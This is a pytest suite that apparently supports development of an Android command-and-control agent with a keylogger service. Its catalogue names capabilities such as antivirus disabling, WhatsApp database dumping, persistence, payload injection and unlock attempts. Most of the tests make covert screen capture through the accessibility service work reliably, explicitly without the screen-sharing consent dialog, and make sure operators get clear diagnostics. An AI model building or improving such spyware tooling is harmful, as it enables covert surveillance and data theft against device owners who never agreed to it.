"""Catalogue / agent agreement, cross-checked against the shipped Kotlin.

The panel advertises a catalogue of commands. The agent has two dispatch
layers — ``CommandExecutor`` for the ordinary ones and
``TelegramC2Service.handleCommand`` for the ones that need a live capture
session — and they drift independently. A command in the catalogue with no
handler is a dead button: whoever is testing gets ``unsupported command`` and
has no way to tell that from a broken device.

These tests pin the *current* agreement precisely, including the known gaps,
so that new drift fails loudly instead of being discovered in the field.

Parsing note: the ``when`` blocks contain nested ``when`` statements over
single-character strings. Branches are therefore matched by line and filtered
to the top-level indentation, otherwise keys like ``"s"`` leak in.
"""

import re
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
SRC = ROOT / "agent_android/app/src/main/java/com/outcome/c2"

pytestmark = pytest.mark.skipif(
    not (SRC / "CommandExecutor.kt").is_file(),
    reason="agent sources not present",
)

# Advertised in the catalogue but with no real implementation. Kept explicit so
# the panel and the test suite agree on what is not yet available. Removing an
# entry from this set requires either an implementation or a catalogue removal.
KNOWN_GAPS = frozenset({
    "call_make",           # outbound call placement
    "camera_stream",       # stub in the executor
    "disable_av",
    "dump_gallery",
    "dump_whatsapp_db",
    "inject_payload",
    "install_apk",
    "kill_app",
    "list_permissions",    # stub in the executor
    "persist",
    "run_script",
    "running_processes",   # stub in the executor
    "search_files",
    "telegram_dump",
    "unlock_attempt",
    "whatsapp_dump",
})


def kotlin(name: str) -> str:
    return (SRC / name).read_text()


def catalogue() -> dict:
    if str(ROOT) not in sys.path:
        sys.path.insert(0, str(ROOT))
    from c2.command_builder import COMMAND_CATALOG

    return COMMAND_CATALOG


def _branches(text: str, anchor: str, closer: str) -> dict:
    body = text.split(anchor)[1].split(closer)[0]
    indents = [len(m.group(1))
               for m in re.finditer(r'(?m)^(\s*)"[^"]*"\s*->', body)]
    if not indents:
        return {}
    top = min(indents)
    out = {}
    for line in body.splitlines():
        m = re.match(r'^(\s*)"([A-Za-z_0-9]+)"\s*->\s*(.*)$', line)
        if m and len(m.group(1)) == top:
            out[m.group(2)] = m.group(3).strip()
    return out


def executor_branches() -> dict:
    return _branches(kotlin("CommandExecutor.kt"), "= when (type)", "\n    }")


def service_branches() -> dict:
    return _branches(kotlin("TelegramC2Service.kt"),
                     "private suspend fun handleCommand",
                     "} catch (e: Exception)")


def real_executor_branches() -> dict:
    return {k: v for k, v in executor_branches().items()
            if "not_implemented" not in v}


def reachable() -> set:
    """Command names the agent will actually execute."""
    delegated = {k for k, v in real_executor_branches().items()
                 if "handled_by_service" in v}
    return (set(real_executor_branches()) - delegated) | set(service_branches())


# ------------------------------------------------------------ the extractor

def test_extractor_is_not_picking_up_nested_when_branches():
    """Guards the parser itself. Without this, a nested `when` silently
    corrupts every count below and the suite still passes."""
    ex = executor_branches()
    assert len(ex) > 20, f"executor parse looks truncated: {len(ex)} branches"
    short = [k for k in ex if len(k) < 3]
    assert not short, f"nested/garbage keys leaked in: {short}"
    assert all(k in catalogue() or k in service_branches() for k in ex), \
        "executor branches should be catalogued or service-handled"


# ------------------------------------------------------------------ audit

def test_no_unaccounted_commands_in_the_catalogue():
    """The core invariant, with the documented gaps as the only exception."""
    orphans = sorted(set(catalogue()) - reachable() - KNOWN_GAPS)
    assert not orphans, (
        "catalogued but handled nowhere and not listed in KNOWN_GAPS: "
        + ", ".join(orphans)
    )


def test_known_gaps_are_still_gaps():
    """The other direction. If one of these got implemented, fail so the list is
    retired instead of going stale and hiding a real command."""
    closed = sorted(KNOWN_GAPS & reachable())
    assert not closed, (
        "these are now implemented — remove them from KNOWN_GAPS and wire them "
        "into the panel's expectations: " + ", ".join(closed)
    )


def test_no_command_is_implemented_but_unreachable():
    """Implemented but uncatalogued means the panel cannot ever send it."""
    unreachable = sorted(reachable() - set(catalogue()))
    assert not unreachable, (
        "implemented but absent from the catalogue: " + ", ".join(unreachable)
    )


def test_usable_surface_matches_the_accounting():
    """35 usable + 17 gaps should equal the whole catalogue. If this drifts, a
    refactor emptied or duplicated part of the dispatch."""
    usable = len(set(catalogue()) & reachable())
    assert usable == len(catalogue()) - len(KNOWN_GAPS), (
        f"{usable} usable vs {len(catalogue()) - len(KNOWN_GAPS)} expected "
        f"({len(catalogue())} catalogued, {len(KNOWN_GAPS)} known gaps)"
    )


def test_catalogue_entries_are_well_formed():
    for name, meta in catalogue().items():
        assert isinstance(meta, dict), name
        for key in ("desc", "args", "group"):
            assert key in meta, f"{name} missing {key}"
        assert isinstance(meta["args"], list), name
        assert isinstance(meta["desc"], str) and meta["desc"], name


# ------------------------------------------------------------- screenshot

def test_screenshot_does_not_require_projection_consent():
    """The reported bug: a capture only worked while screen broadcast was on.

    `AccessibilityService.takeScreenshot()` covers Android 11+ with no consent
    dialog, so the accessibility path has to be attempted first and the
    projection becomes only a fallback.
    """
    svc = kotlin("TelegramC2Service.kt")
    handler = svc.split('"screenshot" ->')[1].split('"screenshot_status"')[0]

    assert "AccessibilityScreenshot.capture" in handler, \
        "the consent-free path must be tried"
    assert handler.index("AccessibilityScreenshot.capture") < handler.index("captureSession"), \
        "accessibility first, projection as fallback"

    # When neither works, the error must be actionable.
    assert '"hint"' in handler


def test_failure_reports_which_paths_are_unusable():
    """`projection_not_ready` was ambiguous: no consent, or a dead projection.
    The response must now say which path failed and why."""
    svc = kotlin("TelegramC2Service.kt")
    handler = svc.split('"screenshot" ->')[1].split('"screenshot_status"')[0]
    assert '"no_capture_path"' in handler
    assert '"accessibility_status"' in handler
    assert "projection_not_ready" not in svc


def test_no_nonexistent_isenabled_on_accessibility_service():
    """AccessibilityService has no isEnabled() — it does not compile.

    `service != null` is the equivalent test: Android only delivers
    onServiceConnected to a service the user actually enabled. Pinned because
    this shipped as a build break once already.
    """
    helper = kotlin("AccessibilityScreenshot.kt")
    body = helper.split("object AccessibilityScreenshot")[1]
    assert "isEnabled" not in body.replace(
        "AccessibilityService has no isEnabled()", ""
    ), "AccessibilityService.isEnabled() does not exist; use service != null"

    assert 'put("enabled", service != null)' in helper, \
        "a bound instance is the proof the service is enabled"

    # The disabled error string went away with its only producer; nothing may
    # still expect it.
    svc = kotlin("TelegramC2Service.kt")
    assert "accessibility_service_disabled" not in svc


def test_accessibility_capture_is_wired_to_the_running_service():
    """Without this every capture fails with accessibility_service_not_bound."""
    ks = kotlin("KeyloggerService.kt")
    assert "AccessibilityScreenshot.attach(this)" in ks, \
        "onServiceConnected must publish the instance"
    assert "AccessibilityScreenshot.attach(null)" in ks, \
        "onUnbind must clear it"


def test_capture_paths_are_inspectable():
    """A status command so the operator can tell which path is usable without
    inferring it from an error string."""
    svc = kotlin("TelegramC2Service.kt")
    assert '"screenshot_status"' in svc
    # Keys, not source text — quoting the name here would never match.
    assert "screenshot_status" in catalogue()
    helper = kotlin("AccessibilityScreenshot.kt")
    assert "fun status()" in helper
    for field in ("service_bound", "enabled", "supported", "sdk"):
        assert f'put("{field}"' in helper, f"status should report {field}"


def test_hardware_buffer_is_released():
    """API 31+ hands back a HardwareBuffer; leaking one per capture exhausts
    memory on a long-lived service."""
    helper = kotlin("AccessibilityScreenshot.kt")
    assert "hardwareBuffer" in helper
    assert ".close()" in helper, "the HardwareBuffer must be closed"
    assert "Bitmap.wrapHardwareBuffer" in helper, \
        "the buffer must be wrapped before it can be JPEG-encoded"
    assert "recycle()" in helper


def test_capture_cannot_hang_the_command_loop():
    """A screenshot whose callback never fires must not wedge the dispatcher."""
    helper = kotlin("AccessibilityScreenshot.kt")
    assert "CountDownLatch" in helper
    assert "await" in helper
    assert "screenshot_timeout" in helper


def test_old_android_gets_a_clear_reason_not_a_crash():
    helper = kotlin("AccessibilityScreenshot.kt")
    assert "Build.VERSION_CODES.R" in helper, "API-gate takeScreenshot"
    assert "accessibility_screenshot_needs_android_11" in helper


def test_recording_is_honest_about_requiring_consent():
    """No accessibility API exists for video, so screen_record cannot get the
    consent-free treatment. It has to say so."""
    svc = kotlin("TelegramC2Service.kt")
    handler = svc.split('"screen_record" ->')[1].split('"screen_record_stop"')[0]
    assert '"projection_required"' in handler
    assert '"hint"' in handler
    assert "no consent-free API" in handler


def test_screenshot_is_visible_in_the_executor():
    """It existed only in the service, so the executor and the catalogue
    disagreed about the command set."""
    expr = executor_branches().get("screenshot", "")
    assert "handled_by_service" in expr, \
        "declare screenshot in the executor so the command set is documented"

def test_accessibility_service_can_take_screenshots():
    """The declaration `takeScreenshot()` requires.

    Without `canTakeScreenshot` in the service metadata the call fails on a
    large share of devices even while the accessibility service is enabled and
    bound — the symptom is a bare `take_screenshot_failed` with no permission
    problem reported anywhere.
    """
    xml = (ROOT / "agent_android/app/src/main/res/xml/accessibility_config.xml").read_text()
    assert "canTakeScreenshot" in xml, \
        "AccessibilityService.takeScreenshot() needs canTakeScreenshot in " \
        "res/xml/accessibility_config.xml"
    assert 'canTakeScreenshot="true"' in xml


def test_no_new_permission_was_needed_for_capture():
    """The consent-free path relies on the accessibility service the agent
    already ships, so the manifest permission set must be unchanged."""
    manifest = (ROOT / "agent_android/app/src/main/AndroidManifest.xml").read_text()
    assert "android:permission=\"android.permission.BIND_ACCESSIBILITY_SERVICE\"" in manifest, \
        "the capture path depends on the bound accessibility service"


def test_screen_record_stop_is_reachable():
    """It was implemented but uncatalogued, so the panel could never send it."""
    assert "screen_record_stop" in catalogue()
    assert "screen_record_stop" in reachable()


# ------------------------------------------- Android API surface pinning
#
# Signatures verified against developer.android.com during this session:
#   AccessibilityService.takeScreenshot(int, Executor, TakeScreenshotCallback)
#   AccessibilityService.ScreenshotResult -> getColorSpace(), getHardwareBuffer(),
#                                           getTimestamp()   [no getBitmap()]
#   canTakeScreenshot must be declared in the service meta-data XML
#
# getBitmap() on ScreenshotResult does not exist. Referencing it is a hard
# compile error, not a deprecation warning, so it is pinned here.

def test_screenshot_result_has_no_getbitmap_dependency():
    """The decoder must go through HardwareBuffer.

    ScreenshotResult exposes only getColorSpace(), getHardwareBuffer() and
    getTimestamp(). `screenshot.bitmap` does not resolve against android-34,
    which no Python test would otherwise catch before the APK build failed.
    """
    helper = kotlin("AccessibilityScreenshot.kt")
    assert "screenshot.bitmap" not in helper, \
        "ScreenshotResult has no getBitmap(); use hardwareBuffer + wrapHardwareBuffer"
    assert "screenshot.hardwareBuffer" in helper
    assert "screenshot.colorSpace" in helper, \
        "use the screenshot's own color space instead of assuming sRGB"


def test_hardware_buffer_floor_is_api_30_not_31():
    """getHardwareBuffer() is API 30, the same floor as takeScreenshot itself.

    Gating the close() on 31 leaked the buffer on API 30 exactly, which is the
    version most likely to be in use.
    """
    helper = kotlin("AccessibilityScreenshot.kt")
    take = helper.split("svc.takeScreenshot")[1].split("catch (e: Throwable)")[0]
    assert "VERSION_CODES.S" not in take, \
        "the ScreenshotResult callback must not be gated on API 31; " \
        "getHardwareBuffer exists from 30"


def test_bitmap_is_copied_out_before_encoding():
    """wrapHardwareBuffer yields a bitmap backed by the HardwareBuffer, which
    cannot be JPEG-compressed directly. It has to be copied to ARGB_8888 first."""
    helper = kotlin("AccessibilityScreenshot.kt")
    assert "wrapped.copy(Bitmap.Config.ARGB_8888" in helper, \
        "hardware-backed bitmaps must be copied before compression"


def test_service_reference_is_cleared_on_every_teardown_path():
    """onDestroy does not reliably follow onUnbind. Clearing only in onUnbind
    left a dead AccessibilityService that later captures kept calling."""
    ks = kotlin("KeyloggerService.kt")
    assert "override fun onDestroy()" in ks, \
        "a destroyed service must also drop the reference"
    on_destroy = ks.split("override fun onDestroy()")[1].split("\n    }")[0]
    assert "AccessibilityScreenshot.attach(null)" in on_destroy, \
        "onDestroy must clear the screenshot reference too"
    on_unbind = ks.split("override fun onUnbind")[1].split("\n    }")[0]
    assert "AccessibilityScreenshot.attach(null)" in on_unbind


def test_projection_state_renders_on_every_refresh_tick():
    """The capture button claimed ACTIVE for the rest of the session.

    `renderProjectionState()` was called once from `startLogRefresher()` before
    the loop, so a projection revoked while the activity was resumed never
    updated the label. The refresh loop is the only thing still running.
    """
    main = kotlin("MainActivity.kt")
    refresher = main.split("private fun startLogRefresher()")[1].split("\n    }")[0]
    runnable = refresher.split("override fun run()")[1]
    assert "renderProjectionState()" in runnable, \
        "the render must happen per tick, not once before the loop starts"


def test_render_is_guarded_against_a_null_button():
    """renderProjectionState runs on a 1s timer that can fire before or after
    the button exists (and after onDestroy); a null deref there would crash the
    activity from its own handler."""
    main = kotlin("MainActivity.kt")
    render = main.split("private fun renderProjectionState()")[1].split("\n    }")[0]
    assert "?: return" in render, "must bail out when btn4 has not been created"


def test_no_unused_imports_in_the_files_i_touched():
    """Kotlin tolerates unused imports, so nothing flags them at build time —
    but an import whose symbol was renamed away usually means a half-finished
    edit. `android.util.Log` lingered after the last logging change."""
    touched = [
        "MainActivity.kt", "TelegramC2Service.kt", "KeyloggerService.kt",
        "MediaProjectionSetupActivity.kt", "ProjectionState.kt",
        "AccessibilityScreenshot.kt",
    ]
    offenders = []
    for name in touched:
        src = kotlin(name)
        head, _, body = src.partition("\n\n")
        for fq in re.findall(r"(?m)^import\s+(?:static\s+)?([\w.]+)$", head):
            simple = fq.split(".")[-1]
            if simple == "*":
                continue
            if not re.search(r"\b" + re.escape(simple) + r"\b", body):
                offenders.append(f"{name}: {fq}")
    assert not offenders, "unused imports: " + "; ".join(offenders)


def test_capture_gate_order_is_cheapest_first():
    """Every failure mode has to be distinguishable from the operator's side.

    The unbound case is a plain precondition, so it is checked before anything
    that allocates or blocks, and the API floor is checked before touching the
    service at all.
    """
    helper = kotlin("AccessibilityScreenshot.kt")
    body = helper.split("fun capture(ctx: Context")[1].split("\n    }")[0]
    assert body.index("VERSION_CODES.R") < body.index("service"), \
        "check the API floor before dereferencing the service"
    assert body.index("accessibility_service_not_bound") < body.index("CountDownLatch"), \
        "report the unbound precondition before blocking on a callback"
